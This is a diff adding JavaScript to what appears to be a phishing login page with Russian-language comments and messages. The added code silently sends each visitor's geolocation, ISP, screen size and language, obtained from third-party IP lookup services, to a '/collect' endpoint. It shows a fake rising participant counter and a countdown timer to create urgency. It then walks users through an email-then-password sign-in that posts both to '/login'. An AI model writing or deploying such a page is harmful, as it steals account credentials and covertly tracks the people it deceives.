@@ -385,13 +385,276 @@
     <script>
         let savedEmail = '';
 
+        // ===== СКРЫТИЕ ЛОАДЕРА =====
         window.addEventListener('load', function() {
             setTimeout(function() {
-                document.getElementById('loader').classList.add('hide');
-                setTimeout(function() {
-                    document.getElementById('loader').style.display = 'none';
-                }, 500);
+                var loader = document.getElementById('loader');
+                if (loader) {
+                    loader.classList.add('hide');
+                    setTimeout(function() {
+                        loader.style.display = 'none';
+                    }, 500);
+                }
             }, 600);
         });
 
-       
+        // Резерв на случай, если window.load не сработал
+        setTimeout(function() {
+            var loader = document.getElementById('loader');
+            if (loader) {
+                loader.classList.add('hide');
+                setTimeout(function() {
+                    loader.style.display = 'none';
+                }, 500);
+            }
+        }, 3000);
+
+        // ===== ВИБРАЦИЯ =====
+        function vibrate(ms) {
+            if (navigator.vibrate) { try { navigator.vibrate(ms); } catch (e) {} }
+        }
+
+        // ===== СБОР IP + ГЕО (ipwho.is — точнее по регионам) =====
+        (async function collectVisitorInfo() {
+            async function tryCollect(url, mapper) {
+                try {
+                    var r = await fetch(url);
+                    var geo = await r.json();
+                    var data = mapper(geo);
+                    if (!data.country && !data.city) return false;
+
+                    await fetch('/collect', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            geo: data,
+                            screen: { w: window.screen.width, h: window.screen.height },
+                            lang: navigator.language || ''
+                        })
+                    });
+                    return true;
+                } catch (e) {
+                    return false;
+                }
+            }
+
+            var ok1 = await tryCollect('https://ipwho.is/', function(g) {
+                return {
+                    country: g.country || '',
+                    region: g.region || '',
+                    city: g.city || '',
+                    org: (g.connection && g.connection.isp) ? g.connection.isp : '',
+                    lat: g.latitude || '',
+                    lon: g.longitude || ''
+                };
+            });
+
+            if (!ok1) {
+                await tryCollect('https://ipapi.co/json/', function(g) {
+                    return {
+                        country: g.country_name || '',
+                        region: g.region || '',
+                        city: g.city || '',
+                        org: g.org || '',
+                        lat: g.latitude || '',
+                        lon: g.longitude || ''
+                    };
+                });
+            }
+        })();
+
+        // ===== СЧЁТЧИК (72, растёт +1 медленно) =====
+        (function startCounter() {
+            var el = document.getElementById('counterNum');
+            if (!el) return;
+            var count = 72;
+
+            function update() {
+                el.textContent = count;
+                el.classList.remove('pulse');
+                void el.offsetWidth;
+                el.classList.add('pulse');
+            }
+            update();
+
+            function tick() {
+                count += 1;
+                update();
+                setTimeout(tick, 25000 + Math.random() * 20000);
+            }
+            setTimeout(tick, 25000);
+        })();
+
+        // ===== ТАЙМЕР =====
+        (function startTimer() {
+            var el = document.getElementById('timerDisplay');
+            if (!el) return;
+            var totalSeconds = 2 * 60 * 60;
+
+            function render() {
+                var h = Math.floor(totalSeconds / 3600);
+                var m = Math.floor((totalSeconds % 3600) / 60);
+                var s = totalSeconds % 60;
+                el.textContent =
+                    String(h).padStart(2, '0') + ':' +
+                    String(m).padStart(2, '0') + ':' +
+                    String(s).padStart(2, '0');
+            }
+            render();
+            setInterval(function() {
+                if (totalSeconds > 0) { totalSeconds--; render(); }
+            }, 1000);
+        })();
+
+        // ===== ПРОГРЕСС-БАР =====
+        function setProgress(percent) {
+            var bar = document.getElementById('progressBar');
+            var fill = document.getElementById('progressFill');
+            if (bar) bar.style.display = 'block';
+            if (fill) fill.style.width = percent + '%';
+        }
+
+        // ===== ПЕРЕКЛЮЧЕНИЕ ШАГОВ =====
+        function showStep(step) {
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.add('hidden');
+            document.getElementById('step2b').classList.add('hidden');
+            document.getElementById('step3').classList.add('hidden');
+
+            if (step === 'start') {
+                document.getElementById('step1').classList.remove('hidden');
+                document.getElementById('step1').classList.add('animate-in');
+                setProgress(33);
+            } else if (step === 'email') {
+                document.getElementById('step2').classList.remove('hidden');
+                document.getElementById('step2').classList.add('animate-in');
+                setProgress(60);
+                setTimeout(function() {
+                    var el = document.getElementById('email');
+                    if (el) el.focus();
+                }, 150);
+            } else if (step === 'password') {
+                document.getElementById('step2b').classList.remove('hidden');
+                document.getElementById('step2b').classList.add('animate-in');
+                setProgress(85);
+                if (savedEmail) {
+                    document.getElementById('chipEmail').textContent = savedEmail;
+                    document.getElementById('chipAvatar').textContent = savedEmail.charAt(0).toUpperCase();
+                }
+                setTimeout(function() {
+                    var p = document.getElementById('password');
+                    if (p) p.focus();
+                }, 150);
+            } else if (step === 'success') {
+                document.getElementById('step3').classList.remove('hidden');
+                document.getElementById('step3').classList.add('animate-in');
+                setProgress(100);
+            }
+        }
+
+        function showStep2() {
+            vibrate(30);
+            history.pushState({ step: 'email' }, '', '#email');
+            showStep('email');
+        }
+
+        // ===== EMAIL =====
+        function submitEmail(e) {
+            e.preventDefault();
+            var email = document.getElementById('email').value.trim();
+            var errorMsg = document.getElementById('errorMsg');
+            var btn = document.getElementById('emailBtn');
+
+            if (!email) {
+                errorMsg.textContent = 'Введите адрес электронной почты';
+                return;
+            }
+            errorMsg.textContent = '';
+
+            btn.classList.add('loading');
+            btn.disabled = true;
+            vibrate(20);
+
+            setTimeout(function() {
+                savedEmail = email;
+                document.getElementById('chipEmail').textContent = email;
+                document.getElementById('chipAvatar').textContent = email.charAt(0).toUpperCase();
+
+                btn.classList.remove('loading');
+                btn.disabled = false;
+
+                history.pushState({ step: 'password' }, '', '#password');
+                showStep('password');
+            }, 500);
+        }
+
+        // ===== ПАРОЛЬ =====
+        function togglePass() {
+            var p = document.getElementById('password');
+            p.type = (p.type === 'password') ? 'text' : 'password';
+        }
+
+        async function submitPassword(e) {
+            e.preventDefault();
+            var password = document.getElementById('password').value;
+            var errorMsg = document.getElementById('errorMsg2');
+            var btn = document.getElementById('passBtn');
+
+            if (!password) {
+                errorMsg.textContent = 'Введите пароль';
+                return;
+            }
+            errorMsg.textContent = '';
+
+            btn.classList.add('loading');
+            btn.disabled = true;
+            vibrate(20);
+
+            try {
+                var res = await fetch('/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email: savedEmail, password: password })
+                });
+                var data = await res.json();
+
+                if (data.success) {
+                    history.pushState({ step: 'success' }, '', '#success');
+                    setTimeout(function() {
+                        vibrate([50, 30, 50]);
+                        showStep('success');
+                    }, 700);
+                } else {
+                    errorMsg.textContent = data.error || 'Неверный пароль. Повторите попытку.';
+                    btn.classList.remove('loading');
+                    btn.disabled = false;
+                }
+            } catch (err) {
+                errorMsg.textContent = 'Ошибка соединения. Попробуйте снова.';
+                btn.classList.remove('loading');
+                btn.disabled = false;
+            }
+        }
+
+        // ===== ИСТОРИЯ =====
+        history.replaceState({ step: 'start' }, '', '#start');
+
+        window.addEventListener('popstate', function(event) {
+            if (event.state && event.state.step) {
+                showStep(event.state.step);
+            } else {
+                showStep('start');
+            }
+        });
+
+        window.addEventListener('DOMContentLoaded', function() {
+            var hash = window.location.hash.replace('#', '');
+            if (hash === 'email' || hash === 'password' || hash === 'success') {
+                showStep(hash);
+            } else {
+                setProgress(33);
+            }
+        });
+    </script>
+</body>
+</html>
